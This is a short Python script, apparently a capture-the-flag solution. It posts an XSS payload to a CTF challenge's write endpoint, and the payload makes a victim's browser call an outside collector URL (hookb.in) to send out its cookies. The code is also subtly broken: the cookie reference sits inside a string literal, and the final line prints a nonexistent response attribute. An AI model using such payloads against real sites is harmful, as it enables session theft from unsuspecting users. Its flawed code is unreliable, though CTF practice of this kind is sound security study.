import requests

url = 'http://csp1.sf.ctf.so/write'

r = requests.post(
    url, data={'content[]': "new Image().src='https://hookb.in/YVMJbNoaN7Fo77ymDm7q?c=document.cookie'"})

print(r.text)
print(r.u)
